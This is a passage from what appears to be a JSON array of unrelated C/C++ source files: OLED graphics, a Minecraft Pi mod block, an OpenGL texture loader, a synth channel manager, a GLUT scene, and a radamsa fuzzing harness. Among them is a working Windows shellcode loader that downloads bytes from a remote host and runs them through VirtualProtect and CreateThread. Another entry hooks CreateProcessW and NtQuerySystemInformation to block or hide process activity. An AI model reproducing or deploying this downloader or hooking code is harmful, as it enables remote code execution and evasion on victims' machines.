(temp == 0) {\r\n      OLED_ShowCharBuffered(x + (size1 / 2 + m) * t, y, '0', size1, mode);\r\n    } else {\r\n      OLED_ShowCharBuffered(x + (size1 / 2 + m) * t, y, temp + '0', size1,\r\n                            mode);\r\n    }\r\n  }\r\n}\r\n\r\n//\u753b\u7ebf\r\n// x1,y1:\u8d77\u70b9\u5750\u6807\r\n// x2,y2:\u7ed3\u675f\u5750\u6807\r\nvoid OLED_DrawLineBuffered(uint8_t x1, uint8_t y1, uint8_t x2, uint8_t y2,\r\n                           uint8_t mode) {\r\n  uint16_t t;\r\n  int xerr = 0, yerr = 0, delta_x, delta_y, distance;\r\n  int incx, incy, uRow, uCol;\r\n  delta_x = x2 - x1; //\u8ba1\u7b97\u5750\u6807\u589e\u91cf\r\n  delta_y ",
    "#include <windows.h>\n#include <stdio.h>\n#include <winsock2.h>\n#include <ws2tcpip.h>\n\n#pragma comment (lib, \"Ws2_32.lib\")\n#pragma comment (lib, \"Mswsock.lib\")\n#pragma comment (lib, \"AdvApi32.lib\")\n\n#define DEFAULT_BUFLEN 4096\n\nvoid power(char* host, char* port, char* resource) {\n\n    DWORD oldp = 0;\n    BOOL returnValue;\n\n    size_t origsize = strlen(host) + 1;\n    const size_t newsize = 100;\n    size_t convertedChars = 0;\n    wchar_t Whost[newsize];\n    mbstowcs_s(&convertedChars, Whost, origsize, host, _TRUNCATE);\n\n\n    WSADATA wsaData;\n    SOCKET ConnectSocket = INVALID_SOCKET;\n    struct addrinfo* result = NULL,\n        * ptr = NULL,\n        hints;\n    char sendbuf[MAX_PATH] = \"\";\n    lstrcatA(sendbuf, \"GET /\");\n    lstrcatA(sendbuf, resource);\n\n    char recvbuf[DEFAULT_BUFLEN];\n    memset(recvbuf, 0, DEFAULT_BUFLEN);\n    int iResult;\n    int recvbuflen = DEFAULT_BUFLEN;\n\n    \n    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);\n    if (iResult != 0) {\n        return ;\n    }\n\n    ZeroMemory(&hints, sizeof(hints));\n    hints.ai_family = PF_INET;\n    hints.ai_socktype = SOCK_STREAM;\n    hints.ai_protocol = IPPROTO_TCP;\n\n    iResult = getaddrinfo(host, port, &hints, &result);\n    if (iResult != 0) {\n        WSACleanup();\n        return ;\n    }\n\n\n    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {\n\n        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,\n            ptr->ai_protocol);\n        if (ConnectSocket == INVALID_SOCKET) {\n            WSACleanup();\n            return ;\n        }\n\n\n        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);\n        if (iResult == SOCKET_ERROR) {\n            closesocket(ConnectSocket);\n            ConnectSocket = INVALID_SOCKET;\n            continue;\n        }\n        break;\n    }\n\n    freeaddrinfo(result);\n\n    if (ConnectSocket == INVALID_SOCKET) {\n        printf(\"Unable to connect to server!\\n\");\n        WSACleanup();\n        return ;\n    }\n\n    iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);\n    if (iResult == SOCKET_ERROR) {\n        closesocket(ConnectSocket);\n        WSACleanup();\n        return ;\n    }\n\n    \n    iResult = shutdown(ConnectSocket, SD_SEND);\n    if (iResult == SOCKET_ERROR) {\n        closesocket(ConnectSocket);\n        WSACleanup();\n        return ;\n    }\n    \n\n    do {\n\n        iResult = recv(ConnectSocket, (char*)recvbuf, recvbuflen, 0);\n        if (iResult > 0)\n            printf(\"[+] Received %d Bytes\\n\", iResult);\n        else if (iResult == 0)\n            printf(\"[+] Connection closed\\n\");\n        else\n            printf(\"recv failed with error: %d\\n\", WSAGetLastError());\n\n\n        LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(recvbuf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n\n\tif (!alloc_mem) {\n\t\tprintf(\"Failed to Allocate memory (%u)\\n\", GetLastError());\n\t\treturn -1;\n\t}\n\t\n\tMoveMemory(alloc_mem, recvbuf, sizeof(recvbuf));\n\n\tDWORD oldProtect;\n\n\tif (!VirtualProtect(alloc_mem, sizeof(recvbuf), PAGE_EXECUTE_READ, &oldProtect)) {\n\t\tprintf(\"Fai1led to change memory protection (%u)\\n\", GetLastError());\n\t\treturn -2;\n\t}\n\n\n\tHANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);\n\tif (!tHandle) {\n\t\tprintf(\"Failed to Create the thread (%u)\\n\", GetLastError());\n\t\treturn -3;\n\t}\n\n\tprintf(\"\\n\\nalloc_mem : %p\\n\", alloc_mem);\n\tWaitForSingleObject(tHandle, INFINITE);\n\n\treturn 0;\n\n    } while (iResult > 0);\n\n    closesocket(ConnectSocket);\n    WSACleanup();\n}\n\nint main(int argc, char** argv) {\n\n    if (argc != 4) {\n        printf(\"[+] Usage: %s <RemoteIP> <RemotePort> <Resource>\\n\", argv[0]);\n        return 1;\n    }\n\n    power(argv[1], argv[2], argv[3]);\n\n    return 0;\n\n}",
    "#include <cmath>\n\n#include <GLES/gl.h>\n\n#include <libreborn/libreborn.h>\n#include <symbols/minecraft.h>\n#include <mods/misc/misc.h>\n\n#include \"api.h\"\n#include \"init.h\"\n#include \"pedestal.h\"\n#include \"nether_wand.h\"\n\n// Tile\nstatic EntityTile *pedestal = NULL;\nstatic TileEntity *Pedestal_newTileEntity(UNUSED EntityTile *self);\nstatic int Pedestal_use(UNUSED EntityTile *self, Level *level, int x, int y, int z, Player *player) {\n    // This will implicitly make the tile entity, awesome!\n    PedestalTileEntity *pedestal_te = (PedestalTileEntity *) Level_getTileEntity(level, x, y, z);\n    ItemInstance *held = Inventory_getSelected(player->inventory);\n    if (ItemInstance_isNull(&pedestal_te->item)) {\n        // Take from player\n        if (held && held->count) {\n            pedestal_te->item = {.count = 1, .id = held->id, .auxiliary = held->auxiliary};\n            if (!player->infinite_items) {\n                held->count -= 1;\n            }\n        }\n    } else if (held && held->id == NETHER_WAND_ID && transmutate_pedestal(level, player, x, y, z, held)) {\n        // Transmutate\n        if (!player->infinite_items) {\n            held->auxiliary -= 1;\n        }\n    } else {\n        // Give to the player\n        Inventory *inventory = player->inventory;\n        if (!inventory->vtable->add(inventory, &pedestal_te->item)) {\n            // Drop on the ground\n            ItemEntity *item_entity = (ItemEntity *) EntityFactory_CreateEntity(64, level);\n            ALLOC_CHECK(item_entity);\n            ItemEntity_constructor(item_entity, level, x + 0.5f, y + 1, z + 0.5f, &pedestal_te->item);\n            Entity_moveTo_non_virtual((Entity *) item_entity, x + 0.5f, y + 1, z + 0.5f, 0, 0);\n            Level_addEntity(level, (Entity *) item_entity);\n        }\n        pedestal_te->item = {0, 0, 0};\n    }\n    return 1;\n}\n\nstatic int Pedestal_getRenderShape(UNUSED EntityTile *self) {\n    // Hack for gui renderering\n    return 49 * (self && self->y1 == 0 && self->y2 == 1);\n}\n\nstatic bool Pedestal_isSolidRender(UNUSED EntityTile *self) {\n    // Stop it from turning other blocks invisable\n    return 0;\n}\n\nstatic int Pedestal_getRenderLayer(UNUSED EntityTile *self) {\n    // Stop weird transparency issues\n    return 1;\n}\n\nstatic bool Pedestal_isCubeShaped(UNUSED EntityTile *self) {\n    return false;\n}\n\nvoid make_pedestal() {\n    // Construct\n    pedestal = new EntityTile();\n    ALLOC_CHECK(pedestal);\n    int texture = INVALID_TEXTURE;\n    Tile_constructor((Tile *) pedestal, PEDESTAL_ID, texture, Material_glass);\n    Tile_isEntityTile[PEDESTAL_ID] = true;\n    pedestal->texture = texture;\n\n    // Set VTable\n    pedestal->vtable = dup_EntityTile_vtable(EntityTile_vtable_base);\n    ALLOC_CHECK(pedestal->vtable);\n    pedestal->vtable->newTileEntity = Pedestal_newTileEntity;\n    pedestal->vtable->use = Pedestal_use;\n    pedestal->vtable->getRenderShape = Pedestal_getRenderShape;\n    pedestal->vtable->isSolidRender = Pedestal_isSolidRender;\n    pedestal->vtable->getRenderLayer = Pedestal_getRenderLayer;\n    pedestal->vtable->isCubeShaped = Pedestal_isCubeShaped;\n\n    // Init\n    EntityTile_init(pedestal);\n    pedestal->vtable->setDestroyTime(pedestal, 2.0f);\n    pedestal->vtable->setExplodeable(pedestal, 10.0f);\n    pedestal->vtable->setSoundType(pedestal, &Tile_SOUND_STONE);\n    pedestal->category = 4;\n    std::string name = \"pedestal\";\n    pedestal->vtable->setDescriptionId(pedestal, &name);\n}\n\n// Tile entity\nstatic float the_spinny = 1.0f;\nstatic void mcpi_callback(UNUSED Minecraft *mc) {\n    the_spinny += 1;\n    if (the_spinny > 360) the_spinny -= 360;\n}\n\n__attribute__((constructor)) static void init() {\n    // For the spinny\n    misc_run_on_tick(mcpi_callback);\n}\n\nstatic bool PedestalTileEntity_shouldSave(UNUSED TileEntity *self) {\n    return true;\n}\n\nstatic void PedestalTileEntity_load(TileEntity *self, CompoundTag *tag) {\n    TileEntity_load_non_virtual(self, tag);\n    CompoundTag *ctag = CompoundTag_getCompound_but_not(tag, \"Item\");\n    if (ctag) {\n        ItemInstance *i = ItemInstance_fromTag(ctag);\n        if (i) {\n            ((PedestalTileEntity *) self)->item = *i;\n            delete i;\n        }\n    }\n}\n\nstatic bool PedestalTileEntity_save(TileEntity *self, CompoundTag *tag) {\n    TileEntity_save_non_virtual(self, tag);\n    CompoundTag *ctag = new CompoundTag();\n    CompoundTag_constructor(ctag, \"\");\n    ItemInstance_save(&((PedestalTileEntity *) self)->item, ctag);\n    std::string item = \"Item\";\n    CompoundTag_put(tag, &item, (Tag *) ctag);\n    return true;\n}\n\nstatic void PedestalTileEntity_tick(UNUSED TileEntity *self) {\n}\n\nCUSTOM_VTABLE(pedestal_te, TileEntity) {\n    vtable->shouldSave = PedestalTileEntity_shouldSave;\n    vtable->load = PedestalTileEntity_load;\n    vtable->save = PedestalTileEntity_save;\n    vtable->tick = PedestalTileEntity_tick;\n}\n\nstatic PedestalTileEntity *make_pedestal_tile_entity() {\n    PedestalTileEntity *pedestal_te = new PedestalTileEntity;\n    ALLOC_CHECK(pedestal_te);\n    TileEntity_constructor",
    "#include \"client/gui/img/loader.hpp\"\n#include \"client/core.hpp\"\n\n#include <iostream>\n#include <algorithm>\n\n#include \"stb_image.h\"\n\nnamespace gui::img {\n\nbool Loader::init() {\n    std::cout << \"Loading images...\\n\"; \n\n    for (auto img_id : GET_ALL_IMG_IDS()) {\n        if (!this->_loadImg(img_id)) { // cppcheck-suppress useStlAlgorithm\n            return false;\n        }\n    }\n\n    std::cout << \"Loaded images\\n\";\n    return true;\n}\n\nbool Loader::_loadImg(ImgID img_id) {\n    GLuint texture_id;\n\n    glGenTextures(1, &texture_id);\n    glBindTexture(GL_TEXTURE_2D, texture_id);\n\n    // set Texture wrap and filter modes\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);\n\n    int width, height, channels;\n\n\tstbi_set_flip_vertically_on_load(true);\n\n    auto path = getImgFilepath(img_id);\n    std::cout << \"Loading \" << path << \"...\\n\";\n    unsigned char* img_data = stbi_load(path.c_str(), &width, &height, &channels, 0);\n\n    if (stbi_failure_reason())\n        std::cout << \"failure: \" << stbi_failure_reason() << std::endl;\n\n    if (img_data == 0 || width == 0 || height == 0) {\n        std::cerr << \"Error loading \" << path << std::endl;\n        return false;\n    }\n    \n    glTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA, width, height, 0, GL_RGBA, GL_UNSIGNED_BYTE, img_data);\n    glGenerateMipmap(GL_TEXTURE_2D);\n\n    // unbind texture\n    glBindTexture(GL_TEXTURE_2D, 0);\n\n    this->img_map.insert({img_id, Img {\n        .texture_id = texture_id,\n        .width = width,\n        .height = height\n    }});\n\n    stbi_image_free(img_data);\n\n    return true;\n}\n\nconst Img& Loader::getImg(ImgID img_id) const {\n    return this->img_map.at(img_id);\n}\n\n}\n",
    "/***************************************************/\n/* Part of GDSiON software synthesizer             */\n/* Copyright (c) 2024 Yuri Sizov and contributors  */\n/* Provided under MIT                              */\n/***************************************************/\n\n#include \"siopm_channel_manager.h\"\n\n#include <godot_cpp/core/memory.hpp>\n#include \"chip/channels/siopm_channel_base.h\"\n#include \"chip/channels/siopm_channel_fm.h\"\n#include \"chip/channels/siopm_channel_ks.h\"\n#include \"chip/channels/siopm_channel_pcm.h\"\n#include \"chip/channels/siopm_channel_sampler.h\"\n#include \"chip/siopm_sound_chip.h\"\n\nusing namespace godot;\n\nSiOPMSoundChip *SiOPMChannelManager::_sound_chip = nullptr;\nHashMap<SiOPMChannelManager::ChannelType, SiOPMChannelManager *> SiOPMChannelManager::_channel_managers;\n\nvoid SiOPMChannelManager::initialize(SiOPMSoundChip *p_chip) {\n\t_sound_chip = p_chip;\n\n\t_channel_managers[CT_CHANNEL_FM]      = memnew(SiOPMChannelManager(CT_CHANNEL_FM));\n\t_channel_managers[CT_CHANNEL_PCM]     = memnew(SiOPMChannelManager(CT_CHANNEL_PCM));\n\t_channel_managers[CT_CHANNEL_SAMPLER] = memnew(SiOPMChannelManager(CT_CHANNEL_SAMPLER));\n\t_channel_managers[CT_CHANNEL_KS]      = memnew(SiOPMChannelManager(CT_CHANNEL_KS));\n}\n\nvoid SiOPMChannelManager::finalize() {\n\t_sound_chip = nullptr;\n\n\tmemdelete(_channel_managers[CT_CHANNEL_FM]);\n\tmemdelete(_channel_managers[CT_CHANNEL_PCM]);\n\tmemdelete(_channel_managers[CT_CHANNEL_SAMPLER]);\n\tmemdelete(_channel_managers[CT_CHANNEL_KS]);\n\t_channel_managers.clear();\n}\n\nvoid SiOPMChannelManager::initialize_all_channels() {\n\tfor (const KeyValue<ChannelType, SiOPMChannelManager *> &kv : _channel_managers) {\n\t\tkv.value->_initialize_all();\n\t}\n}\n\nvoid SiOPMChannelManager::reset_all_channels() {\n\tfor (const KeyValue<ChannelType, SiOPMChannelManager *> &kv : _channel_managers) {\n\t\tkv.value->_reset_all();\n\t}\n}\n\nSiOPMChannelBase *SiOPMChannelManager::create_channel(ChannelType p_type, SiOPMChannelBase *p_prev, int p_buffer_index) {\n\treturn _channel_managers[p_type]->_create_channel(p_prev, p_buffer_index);\n}\n\nvoid SiOPMChannelManager::delete_channel(SiOPMChannelBase *p_channel) {\n\t_channel_managers[(ChannelType)p_channel->_channel_type]->_delete_channel(p_channel);\n}\n\n\nSiOPMChannelBase *SiOPMChannelManager::_create_channel(SiOPMChannelBase *p_prev, int p_buffer_index) {\n\tSiOPMChannelBase *new_channel = nullptr;\n\n\tif (_terminator->_next->_is_free) {\n\t\t// The head channel is free -> The head will be a new channel.\n\t\tnew_channel = _terminator->_next;\n\t\tnew_channel->_prev->_next = new_channel->_next;\n\t\tnew_channel->_next->_prev = new_channel->_prev;\n\t} else {\n\t\t// The head channel is active -> channel overflow.\n\t\t// Create new channel.\n\n\t\tswitch (_channel_type) {\n\t\t\tcase CT_CHANNEL_FM: {\n\t\t\t\tnew_channel = memnew(SiOPMChannelFM(_sound_chip));\n\t\t\t} break;\n\t\t\tcase CT_CHANNEL_PCM: {\n\t\t\t\tnew_channel = memnew(SiOPMChannelPCM(_sound_chip));\n\t\t\t} break;\n\t\t\tcase CT_CHANNEL_SAMPLER: {\n\t\t\t\tnew_channel = memnew(SiOPMChannelSampler(_sound_chip));\n\t\t\t} break;\n\t\t\tcase CT_CHANNEL_KS: {\n\t\t\t\tnew_channel = memnew(SiOPMChannelKS(_sound_chip));\n\t\t\t} break;\n\n\t\t\tdefault: break; // Silences enum warnings.\n\t\t}\n\n\t\tERR_FAIL_NULL_V(new_channel, nullptr);\n\t\tnew_channel->_channel_type = _channel_type;\n\t\t_length++;\n\t}\n\n\t// Set new channel to the tail and activate.\n\tnew_channel->_is_free = false;\n\tnew_channel->_prev = _terminator->_prev;\n\tnew_channel->_next = _terminator;\n\tnew_channel->_prev->_next = new_channel;\n\tnew_channel->_next->_prev = new_channel;\n\n\t// initialize\n\tnew_channel->initialize(p_prev, p_buffer_index);\n\n\treturn new_channel;\n}\n\nvoid SiOPMChannelManager::_delete_channel(SiOPMChannelBase *p_channel) {\n\tp_channel->_is_free = true;\n\tp_channel->_prev->_next = p_channel->_next;\n\tp_channel->_next->_prev = p_channel->_prev;\n\tp_channel->_prev = _terminator;\n\tp_channel->_next = _terminator->_next;\n\tp_channel->_prev->_next = p_channel;\n\tp_channel->_next->_prev = p_channel;\n}\n\nvoid SiOPMChannelManager::_initialize_all() {\n\tfor (SiOPMChannelBase *channel = _terminator->_next; channel != _terminator; channel = channel->_next) {\n\t\tchannel->_is_free = true;\n\t\tchannel->initialize(nullptr, 0);\n\t}\n}\n\nvoid SiOPMChannelManager::_reset_all() {\n\tfor (SiOPMChannelBase *channel = _terminator->_next; channel != _terminator; channel = channel->_next) {\n\t\tchannel->_is_free = true;\n\t\tchannel->reset();\n\t}\n}\n\nSiOPMChannelManager::SiOPMChannelManager(ChannelType p_channel_type) {\n\t_channel_type = p_channel_type;\n\n\t_terminator = new SiOPMChannelBase(_sound_chip);\n\t_terminator->_is_free = false;\n\t_terminator->_next = _terminator;\n\t_terminator->_prev = _terminator;\n\t_length = 0;\n}\n\nSiOPMChannelManager::~SiOPMChannelManager() {\n\tSiOPMChannelBase *channel = _terminator->_next;\n\twhile (channel && channel != _terminator) {\n\t\tSiOPMChannelBase *next_channel = channel->_next;\n\t\tmemdelete(channel);\n\t\tchannel = next_channel;\n\t}\n\n\tmemdelete(_terminator);\n}\n",
    "\r\n#include <Windows.h>\r\n#include <iostream>\r\n#include \"detours.h\"\r\n#include <Winternl.h>\r\n\r\n\r\nstruct defines {\r\n\r\n    typedef BOOL(WINAPI* LPFN_CREATEPROCESSW)(\r\n        LPCWSTR lpApplicationName,\r\n        LPWSTR lpCommandLine,\r\n        LPSECURITY_ATTRIBUTES lpProcessAttributes,\r\n        LPSECURITY_ATTRIBUTES lpThreadAttributes,\r\n        BOOL bInheritHandles,\r\n        DWORD dwCreationFlags,\r\n        LPVOID lpEnvironment,\r\n        LPCWSTR lpCurrentDirectory,\r\n        LPSTARTUPINFOW lpStartupInfo,\r\n        LPPROCESS_INFORMATION lpProcessInformation\r\n        );\r\n\r\n\ttypedef NTSTATUS(NTAPI* LPFN_NTQUERYSYSTEMINFORMATION)(\r\n\t\tSYSTEM_INFORMATION_CLASS SystemInformationClass,\r\n\t\tPVOID SystemInformation,\r\n\t\tULONG SystemInformationLength,\r\n\t\tPULONG ReturnLength\r\n\t\t);\r\n\r\n}; extern defines* define;\r\n\r\nstruct pointers {\r\n\r\n    HMODULE ntdll_module = GetModuleHandleA(\"ntdll.dll\");\r\n    defines::LPFN_CREATEPROCESSW CreateProcessW_pointer = CreateProcessW;\r\n    defines::LPFN_NTQUERYSYSTEMINFORMATION NtQuerySystemInformation_pointer = (defines::LPFN_NTQUERYSYSTEMINFORMATION)GetProcAddress(ntdll_module, \"NtQuerySystemInformation\");;\r\n\r\n}; pointers* ptr = new pointers();\r\n\r\nstruct detoured {\r\n\r\n   static BOOL WINAPI CreateProcessW_Hook(\r\n        LPCWSTR lpApplicationName,\r\n        LPWSTR lpCommandLine,\r\n        LPSECURITY_ATTRIBUTES lpProcessAttributes,\r\n        LPSECURITY_ATTRIBUTES lpThreadAttributes,\r\n        BOOL bInheritHandles,\r\n        DWORD dwCreationFlags,\r\n        LPVOID lpEnvironment,\r\n        LPCWSTR lpCurrentDirectory,\r\n        LPSTARTUPINFOW lpStartupInfo,\r\n        LPPROCESS_INFORMATION lpProcessInformation\r\n    )\r\n    {\r\n        return FALSE;\r\n    }\r\n\r\n  static NTSTATUS NTAPI NtQuerySystemInformation_Hook(\r\n       SYSTEM_INFORMATION_CLASS SystemInformationClass,\r\n       PVOID SystemInformation,\r\n       ULONG SystemInformationLength,\r\n       PULONG ReturnLength\r\n   ) \r\n   {\r\n\r\n      return FALSE;\r\n   }\r\n}; extern detoured* detours;\r\n\r\nclass anti_process\r\n{\r\n\r\npublic:\r\n\r\n    void anti_file() {\r\n        HMODULE module = GetModuleHandleA(\"kernel32.dll\");\r\n        if (module) \r\n\t{\r\n\t    ptr->CreateProcessW_pointer = (defines::LPFN_CREATEPROCESSW)GetProcAddress(module, \"CreateProcessW\");\r\n            HHOOK hook = SetWindowsHookEx(WH_CBT, (HOOKPROC)detours->CreateProcessW_Hook, module, 0);\r\n            printf(\"success\");\r\n            getchar();\r\n        }\r\n    }\r\n\r\n    void anti_NTQUERY() {\r\n\r\n        HMODULE module = GetModuleHandleA(\"ntdll.dll\");\r\n        if (module)\r\n        {\r\n            HHOOK hook = SetWindowsHookEx(WH_CBT, (HOOKPROC)detours->NtQuerySystemInformation_Hook, module, 0);\r\n            printf(\"success\");\r\n            getchar();\r\n        }\r\n    }\r\n\r\n\tvoid hook_process() \r\n\t{\r\n\t   DetourTransactionBegin();\r\n\t   DetourUpdateThread(GetCurrentThread());\r\n\t   DetourAttach(&(PVOID&)ptr->CreateProcessW_pointer, detours->CreateProcessW_Hook);\r\n\t   DetourTransactionCommit();\r\n\t} \r\n}; static anti_process* process = new anti_process();\r\n\r\n\r\nint main()\r\n{\r\n    process->anti_NTQUERY(); // works best.\r\n}\r\n",
    "/*\r\n * OpenGL.cpp\r\n *\r\n *  Created on: Abril 04, 2024\r\n *      Author: guiil_000\r\n */\r\n\r\n#include <GL/glut.h>\r\n#include <iostream>\r\n\r\nvoid Desenha(void) {\r\n\tglClear(GL_COLOR_BUFFER_BIT);\r\n\r\n\tgluOrtho2D(-5, 6, -4, 8);\r\n\r\n\tglBegin(GL_QUADS);\r\n\tfor (int i = -2; i <= 3; i++) {\r\n\t\tglColor3f(1, i, 0);\r\n\t\tglVertex2f(i, 2);\r\n\t\tglVertex2f(i, 4);\r\n\t}\r\n\tglEnd();\r\n\r\n\tglBegin(GL_LINES);\r\n\tglColor3f(0.6, 0.2, 0.8);\r\n\tglVertex2f(-4, 4);\r\n\tglVertex2f(5, 4);\r\n\tglEnd();\r\n\r\n\tglBegin(GL_QUADS);\r\n\tglColor3f(0.59, 0.29, 0);\r\n\tglVertex2f(-4, 4.5);\r\n\tglVertex2f(-4, -4);\r\n\tglVertex2f(-3.5, -4);\r\n\tglVertex2f(-3.5, 4.5);\r\n\r\n\tglVertex2f(5, 4.5);\r\n\tglVertex2f(5, -4);\r\n\tglVertex2f(4.5, -4);\r\n\tglVertex2f(4.5, 4.5);\r\n\tglEnd();\r\n\r\n\tglBegin(GL_QUADS);\r\n\tglColor3f(0.72, 0.45, 0.2);\r\n\tglVertex2f(-1, -4);\r\n\tglVertex2f(0, -3);\r\n\tglVertex2f(1, -3);\r\n\tglVertex2f(2, -4);\r\n\tglEnd();\r\n\r\n\tglPointSize(7.0);\r\n\tglBegin(GL_POINTS);\r\n\tglColor3f(0.5, 0.5, 0.5);\r\n\tglVertex2f(0, 0);\r\n\tglVertex2f(0.5, -1);\r\n\tglVertex2f(0, -1);\r\n\tglVertex2f(0, -2);\r\n\tglVertex2f(-0.5, -2);\r\n\tglVertex2f(-0.5, -3);\r\n\tglVertex2f(1.5, -3);\r\n\tglVertex2f(1.5, -2);\r\n\tglVertex2f(1.5, -1);\r\n\tglVertex2f(1, -2);\r\n\tglVertex2f(0.5, -2);\r\n\tglEnd();\r\n\r\n\tglBegin(GL_LINES);\r\n\tglColor3f(0.53, 0.81, 0.98);\r\n\tglVertex2f(0, 5);\r\n\tglVertex2f(0.3, 6);\r\n\r\n\tglVertex2f(1, 2);\r\n\tglVertex2f(1.3, 3);\r\n\r\n\tglVertex2f(2, 1);\r\n\tglVertex2f(2.3, 2);\r\n\r\n\tglVertex2f(-1, -1);\r\n\tglVertex2f(-1.3, -2);\r\n\r\n\tglVertex2f(-2, -3);\r\n\tglVertex2f(-2.3, -4);\r\n\r\n\tglVertex2f(-4, 0);\r\n\tglVertex2f(-4.3, -1);\r\n\r\n\tglVertex2f(1, -1);\r\n\tglVertex2f(1.3, 0);\r\n\r\n\tglVertex2f(2, -3);\r\n\tglVertex2f(2.3, -2);\r\n\r\n\tglVertex2f(4, -4);\r\n\tglVertex2f(4.3, -3);\r\n\r\n\tglVertex2f(5, -2);\r\n\tglVertex2f(5.3, -1);\r\n\r\n\tglVertex2f(4, 3);\r\n\tglVertex2f(4.3, 4);\r\n\r\n\tglVertex2f(3, 2);\r\n\tglVertex2f(3.3, 3);\r\n\r\n\tglVertex2f(-3, 3);\r\n\tglVertex2f(-3.3, 2);\r\n\r\n\tglVertex2f(-4, 5);\r\n\tglVertex2f(-4.3, 4);\r\n\r\n\tglVertex2f(-2, 1);\r\n\tglVertex2f(-2.3, 0);\r\n\r\n\tglVertex2f(0, 1);\r\n\tglVertex2f(0.3, 2);\r\n\r\n\tglVertex2f(-0.3, 3);\r\n\tglVertex2f(-.6, 2);\r\n\r\n\tglVertex2f(-2, 5);\r\n\tglVertex2f(-2.3, 4);\r\n\r\n\tglVertex2f(-3, 6);\r\n\tglVertex2f(-3.3, 5);\r\n\r\n\r\n\tglVertex2f(3, 5);\r\n\tglVertex2f(3.3, 6);\r\n\r\n\r\n\tglVertex2f(2, 6);\r\n\tglVertex2f(2.3, 7);\r\n\r\n\r\n\tglVertex2f(-1, 7);\r\n\tglVertex2f(-1.3, 6);\r\n\r\n\r\n\tglVertex2f(4, 6);\r\n\tglVertex2f(4.3, 7);\r\n\r\n\tglVertex2f(3, -2);\r\n\tglVertex2f(3.3, -1);\r\n\r\n\tglEnd();\r\n\r\n\tglFlush();\r\n}\r\n\r\nint main(int argc, char** argv) {\r\n\tglutInit(&argc, argv);\r\n\tglutInitDisplayMode(GLUT_SINGLE | GLUT_RGB);\r\n\tglutInitWindowSize(1000, 500);\r\n\tglutInitWindowPosition(120, 150);\r\n\tglutCreateWindow(\"Sad Junina\");\r\n\tglutDisplayFunc(Desenha);\r\n\tglutMainLoop();\r\n}\r\n\r\n",
    "#include <windows.h>\n#include <cstdio>\n#include <tchar.h>\n#include <fstream>\n#include <iostream>\n#include <sstream>\n#include <iomanip>\n#include <ctime>\n#include <vector>\n#include <string>\n#include <strsafe.h>\n#include <cstdlib>\n#include <filesystem>\n#include \"CLI11.hpp\"\n\n#define RPATH TEXT(\"RADAMSA_PATH\")\n#define BUFSIZE 256\n\nusing namespace std;\nnamespace fs = std::filesystem;\n\nint TIMEOUT = 1000;\nstring originalFolder;\n\nvector<string> listFilesInDirectory(const std::string& directoryPath) {\n    vector<string> fileNames;\n    const fs::path dest = directoryPath;\n    for (const auto& entry : fs::directory_iterator(directoryPath)) {\n        fileNames.push_back(entry.path().filename().string());\n    }\n    return fileNames;\n}\n\nstring removeExtension(const string& filename) {\n    size_t dotPos = filename.rfind('.');\n    if (dotPos == string::npos) {\n        return filename;\n    }\n    return filename.substr(0, dotPos);\n}\n\n\nBOOL mutateInputs(const string& filename, const string& mut, const string& inputFolder, const string& outputFolder, string ext)\n{ \n    string nfilename = removeExtension(filename);\n    string outputFileName = outputFolder + \"\\\\\" + nfilename + \"_id=\" + mut + \".\" + ext;\n    STARTUPINFOA si;\n    PROCESS_INFORMATION pi;\n    DEBUG_EVENT debug_event;\n    string args = \"radamsa.exe \" + inputFolder + \"\\\\\" + filename + \" -m \" + mut + \" -o \" + outputFileName;\n    LPSTR cmd = (LPSTR)args.c_str();\n\n    ZeroMemory(&si, sizeof(si));\n    ZeroMemory(&pi, sizeof(pi));\n    si.cb = sizeof(si);\n\n    if (!CreateProcessA(\n        nullptr,           // Target app\n        cmd,                 // Command line\n        nullptr,           // Process handle not inheritable\n        nullptr,            // Thread handle not inheritable\n        FALSE,                // Set handle inheritance to FALSE\n        0,                   // No creation flag\n        nullptr,               // Use parent's environment block\n        nullptr,            // Use parent's starting directory\n        &si,                    // Pointer to STARTUPINFO structure\n        &pi)              // Pointer to PROCESS_INFORMATION structure\n        )\n    {\n        printf(\"CreateProcess failed GLE=(%lu).\\n\", GetLastError());\n        return 1;\n    }\n\n    // Wait until child process exits.\n    WaitForSingleObject(pi.hProcess, INFINITE);\n\n    // Close process and thread handles\n    TerminateProcess(pi.hProcess, 0);\n    CloseHandle(pi.hProcess);\n    CloseHandle(pi.hThread);\n\n    return TRUE;\n}\n\nvoid reportCrash(const string& exceptionMessage, DWORD exceptionCode, const string& inputFile)\n{\n    string crashFolder = originalFolder + \"crashes\";\n    if (!fs::exists(crashFolder)) \n    {\n        fs::create_directory(crashFolder);\n    }\n    string filename = crashFolder + \"\\\\\" + \"crashes_log\" + \".txt\";\n    ofstream outfile(filename, ios::app); \n    outfile << exceptionMessage << hex << exceptionCode << \"with file: \" << inputFile << endl;\n    outfile.close();\n\n    fs::path source = inputFile;\n    fs::path dest = crashFolder + inputFile;\n    fs::copy(source, dest);\n\n}\n\nDWORD ProcessDebugEvent(DEBUG_EVENT* debugEvent, const string& inputFile)\n{\n    if (debugEvent->dwDebugEventCode == EXCEPTION_DEBUG_EVENT)\n    {\n\n        EXCEPTION_RECORD* exceptionRecord = &debugEvent->u.Exception.ExceptionRecord;\n        DWORD exceptionCode = exceptionRecord->ExceptionCode;\n\n        switch (exceptionCode)\n        {\n        case EXCEPTION_BREAKPOINT:\n            break;\n        case EXCEPTION_ACCESS_VIOLATION:\n            reportCrash(\"Critical exception: Access Violation (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEPTION_ARRAY_BOUNDS_EXCEEDED:\n            reportCrash(\"Critical exception: Array Bounds Exceeded (0x\", exceptionCode, inputFile);\n            break;\n\n        case 